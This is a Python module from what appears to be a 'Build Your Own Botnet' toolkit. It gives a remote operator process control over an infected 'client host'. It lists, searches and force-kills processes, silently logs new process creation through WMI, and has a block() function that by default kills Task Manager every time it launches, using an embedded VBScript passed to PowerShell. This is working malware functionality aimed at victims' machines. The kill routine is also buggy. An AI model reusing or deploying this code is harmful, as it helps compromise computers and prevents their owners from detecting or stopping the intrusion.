#!/usr/bin/python
# -*- coding: utf-8 -*-
'Process Utilities (Build Your Own Botnet)'

# standard libarary
import os
import json
import time
import string
import urllib
import threading

try:
    from StringIO import StringIO  # Python 2
except ImportError:
    from io import StringIO        # Python 3

# utilities
import util

# globals
packages  = ['wmi','pythoncom'] if os.name == 'nt' else []
platforms = ['win32','linux2','darwin']
usage = 'process <list/search/kill>'
description = """
List/search/kill currently running processes on the client host machine
"""
log = StringIO()
template_block = string.Template("""On Error Resume Next
Set objWshShl = WScript.CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:" & "{impersonationLevel=impersonate}!//./root/cimv2")
Set colMonitoredProcesses = objWMIService.ExecNotificationQuery("select * from __instancecreationevent " & " within 1 where TargetInstance isa 'Win32_Process'")
Do
    Set objLatestProcess = colMonitoredProcesses.NextEvent
    If objLatestProcess.TargetInstance.Name = "${PROCESS}" Then
        objLatestProcess.TargetInstance.Terminate
        End If
Loop""")

# main
def _monitor(keyword):
    if os.name != 'nt':
        return "Error: Windows platforms only"
    try:
        import wmi
        import pythoncom
        pythoncom.CoInitialize()
        c = wmi.WMI()
        if not len(globals()['log'].getvalue()):
            globals()['log'].write('Time, Owner, Executable, PID, Parent\n')
        process_watcher = c.Win32_Process.watch_for("creation")
        while True:
            try:
                new_process = process_watcher()
                proc_owner = new_process.GetOwner()
                proc_owner = "%s\\%s" % (proc_owner[0], proc_owner[2])
                create_date = new_process.CreationDate
                executable = new_process.ExecutablePath
                pid = new_process.ProcessId
                parent_pid = new_process.ParentProcessId
                row = '"%s", "%s", "%s", "%s", "%s"\n' % (create_date, proc_owner, executable, pid, parent_pid)
                if keyword in row:
                    globals()['log'].write(row)
            except Exception as e1:
                util.log("{} error: {}".format(monitor.func_name, str(e1)))
            if globals()['_abort']:
                break
    except Exception as e2:
        util.log("{} error: {}".format(monitor.func_name, str(e2)))

def list(*args, **kwargs):
    """
    List currently running processes

    Returns process list as a dictionary (JSON) object

    """
    try:
        output  = {}
        for i in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:]:
            pid = i.split()[1 if os.name == 'nt' else 0]
            exe = i.split()[0 if os.name == 'nt' else -1]
            if exe not in output:
                if len(json.dumps(output)) < 48000:
                    output.update({pid: exe})
                else:
                    break
        return json.dumps(output)
    except Exception as e:
        util.log("{} error: {}".format(list.func_name, str(e)))

def search(keyword):
    """
    Search currently running processes for a keyword

    `Required`
    :param str keyword:   keyword to search for

    Returns process list as dictionary (JSON) object

    """
    try:
        if not isinstance(keyword, str) or not len(keyword):
            return "usage: process search [PID/name]"
        output  = {}
        for i in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:]:
            pid = i.split()[1 if os.name == 'nt' else 0]
            exe = i.split()[0 if os.name == 'nt' else -1]
            if keyword in exe:
                if len(json.dumps(output)) < 48000:
                    output.update({pid: exe})
                else:
                    break
        return json.dumps(output)
    except Exception as e:
        util.log("{} error: {}".format(search.func_name, str(e)))

def kill(process_id):
    """
    Kill a running process with a given PID

    `Required`
    :param int pid:   PID of process

    Returns killed process list as dictionary (JSON) object
    """
    try:
        output  = {}
        for i in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:]:
            pid = i.split()[1 if os.name == 'nt' else 0]
            exe = i.split()[0 if os.name == 'nt' else -1]
            if str(process_id).isdigit() and int(process_id) == int(pid):
                try:
                    _ = os.popen('taskkill /pid %s /f' % pid if os.name == 'nt' else 'kill -9 %s' % pid).read()
                    output.update({process_id: "killed"})
                except:
                    output.update({process_id: "not found"})
            else:
                try:
                    _ = os.popen('taskkill /im %s /f' % exe if os.name == 'nt' else 'kill -9 %s' % exe).read()
                    output.update({exe: "killed"})
                except Exception as e:
                    util.log(e)
            return json.dumps(output)
    except Exception as e:
        util.log("{} error: {}".format(kill.func_name, str(e)))

def monitor(keyword):
    """
    Monitor the host machine for process creation with the given keyword in the name

    `Required`
    :param str keyword:    process name/keyword

    """
    t = threading.Thread(target=_monitor, args=(keyword,), name=time.time())
    t.daemon = True
    t.start()
    return t

def block(process_name='taskmgr.exe'):
    """
    Block a process from running by immediately killing it every time it spawns

    `Optional`
    :param str process_name:    process name to block (default: taskmgr.exe)

    """
    global template_block
    try:
        code = template_block.substitute(PROCESS=process_name)
        _ = util.powershell(code)
        return "Process {} blocked".format(process_name)
    except Exception as e:
        util.log("{} error: {}".format(block.func_name, str(e)))
